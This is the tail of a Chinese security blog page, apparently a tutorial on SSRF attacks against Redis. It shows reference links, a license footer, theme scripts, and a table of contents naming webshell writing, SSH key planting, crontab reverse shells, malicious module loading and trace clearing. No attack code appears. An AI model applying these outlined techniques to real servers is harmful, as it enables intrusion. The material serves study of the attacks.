<p><a target="_blank" rel="noopener" href="https://inhann.top/2021/09/14/redis_master_slave_rce/">redis 主从复制 RCE</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5665#toc-2">浅析Redis中SSRF的利用</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/325035.html">Redis主从复制RCE影响分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/242692.html">服务端请求伪造（SSRF）之Redis篇</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/X5-cJtF2RC0AkoYH-PdihA">SSRF+Redis</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/263556.html">利用SSRF攻击内网Redis服务</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/242692.html">服务端请求伪造（SSRF）之Redis篇</a></p>
<p><a target="_blank" rel="noopener" href="http://www.cdcxht.com/News_read_id_178.shtml">Redis主从复制RCE分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/293030.html">很经典的一道CTF-WriteUP[网鼎杯 2020 玄武组]SSRFMe</a></p>
<p><a target="_blank" rel="noopener" href="https://pino-hd.github.io/2018/06/19/%E5%88%A9%E7%94%A8WebLogic-SSRF%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91Redis%E5%8F%8D%E5%BC%B9shell/">利用WebLogic SSRF漏洞攻击内网Redis反弹shell</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Ah67tLoL8EyjgH6RBumNYw">SSRF中Redis的利用</a></p>
<p><a target="_blank" rel="noopener" href="https://johnfrod.top/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/weblogic-ssrf%EF%BC%88cve-2014-4210%EF%BC%89/">WebLogic SSRF（CVE-2014-4210）</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ajsafe.com/news/180.html">SSRF——weblogic vulhub 漏洞复现及攻击内网redis（一）（附批量检测脚本）</a></p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/12/31/shen-tou-ce-shi-wai-wang-da-dian/">渗透测试流程&外网打点</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/12/25/open-basedir-wakeup-rao-guo/">open_basedir+wake_up绕过总结</a></div></section></div>






<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-ssrf%E4%BB%8B%E7%BB%8D"><span class="toc-text">0x01 SSRF介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">0x02 环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">0x03 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#resp%E5%8D%8F%E8%AE%AE"><span class="toc-text">RESP协议</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-redis%E9%85%8D%E5%90%88gopher%E5%8D%8F%E8%AE%AE%E8%BF%9B%E8%A1%8Cssrf"><span class="toc-text">0x04 Redis配合gopher协议进行SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB"><span class="toc-text">redis认证攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AF%86%E7%A0%81redis%E6%94%BB%E5%87%BB"><span class="toc-text">无密码Redis攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%AF%86%E7%A0%81redis%E6%94%BB%E5%87%BB"><span class="toc-text">有密码Redis攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%86%99webshell"><span class="toc-text">绝对路径写webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-text">构造payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99ssh%E5%85%AC%E9%92%A5"><span class="toc-text">写ssh公钥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%94%BB%E5%87%BB%E6%9C%BA%E5%85%AC%E9%92%A5"><span class="toc-text">生成攻击机公钥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8contrab%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">利用contrab计划任务反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-text">构造payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6rce"><span class="toc-text">0x05 Redis主从复制RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%A6%82%E5%BF%B5"><span class="toc-text">主从复制概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis-module"><span class="toc-text">redis module</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-text">攻击原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E9%87%8F%E5%A4%8D%E5%88%B6%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-text">全量复制的过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A2%9E%E9%87%8F%E5%A4%8D%E5%88%B6%E9%83%A8%E5%88%86%E5%A4%8D%E5%88%B6"><span class="toc-text">增量复制（部分复制）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-text">攻击流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-text">任意文件写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8Fso"><span class="toc-text">redis加载恶意.so</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E8%BF%9B%E8%A1%8Credis%E5%8A%A0%E8%BD%BDso"><span class="toc-text">SSRF进行redis加载.so</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4"><span class="toc-text">痕迹清除</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E9%A2%98%E7%9B%AE%E5%AE%9E%E6%88%98"><span class="toc-text">0x06 题目实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfhub-ssrf-redis%E5%8D%8F%E8%AE%AE"><span class="toc-text">CTFHUB-SSRF-redis协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis-4x5x%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6rce"><span class="toc-text">Redis 4.x&#x2F;5.x主从复制RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme"><span class="toc-text">[网鼎杯 2020 玄武组]SSRFMe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#weblogic-ssrf%E6%BC%8F%E6%B4%9E"><span class="toc-text">Weblogic SSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">0x07 修复建议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93"><span class="toc-text">0x08 知识总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dict%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">Dict协议使用注意事项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crontab%E5%86%99%E5%85%A5tips"><span class="toc-text">crontab写入Tips</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">0x09 参考文章</span></a></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
